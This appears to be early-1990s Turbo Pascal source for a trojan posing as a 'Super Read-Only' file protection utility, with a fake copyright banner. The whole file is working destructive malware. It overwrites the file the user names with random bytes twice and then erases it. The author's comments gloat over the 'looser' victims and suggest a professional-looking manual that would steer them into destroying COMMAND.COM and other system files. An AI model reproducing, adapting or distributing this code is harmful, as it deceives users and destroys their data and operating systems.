{   Trojan - Obliterate!; }

{  This phile is designed to garble and erase any file that the user
   wants to make "Read-Only" (thats the hook). It does so by writing over
   the file with random byte values, multiple times.
   The looser thinks this is a protection scheme (named PRO_TEK
   or some shit). Whatever is the file name entered is really GONE!
   The trick issue is to develop a doc file that explains 'professionally'
   that the permanent write-protection of this program is IDEAL for files
   like COMMAND.COM, all of the looser's OS, etc.   
   Designed by: *** SaNDoZ ***  {Super Read-Only utility - hahahahah}

{   i know it's grossly simple but it's a riot!
   Note: like Norton's WipeDisk once it's gone, IT'S GONE! It's really vicious.
   Any party may make modifications to this as they see fit, just make sure
   that I can get a copy of it if it's really cool.  If you have any
   questions/comments I can be reached occasionally on Buck 'an Ear.
   
}

uses Dos;

var Target    : String;
    f         : File of Byte;
    FSize     : LongInt;
    Space     : Byte;
    S         : PathStr;
    Counter   : Real;
    I         : Integer;
    GoAhead   : Char;

begin
  Randomize;
  WriteLn('SuperRead-Only - (C)opyright 1992 Micro Software, Ltd.');
  WriteLn;
  Write('File you wish to PROTECT:');
  Readln(Target);
  If Target = '' then begin
    WriteLn;
    WriteLn('Error: Program terminated.');
    WriteLn('You must specify a file name.');
    Halt;
  end;
  Assign(f,Target);
  S := FSearch(Target,GetEnv('PATH'));
  if S = '' then begin
    WriteLn(Target,' not found.');
    WriteLn('Program Terminated.');
    Halt;
  end;
  Reset (f);
  FSize := FileSize (f);
  Close (f);
  WriteLn;
  WriteLn(Target,' is ',FSize,' bytes.');
  WriteLn('To SUPER WRITE-PROTECT this file, press [Y].');
  Write('Any other key will terminate.           :');
  ReadLn(GoAhead);
  If (GoAhead <> 'Y') and (GoAhead <> 'y') then
    Halt;
  Reset(f);
  I := 0;
  Repeat
    Seek(f,1);
    Counter := 0;
    Repeat
      Space := Random (256);
      Write(f,Space);
      Counter := Counter +1;
    Until(Counter = FSize);
    I := I +1;
  Until(I = 2);
  Close(f);
  Erase(f);
  WriteLn('Finished!');
 end.
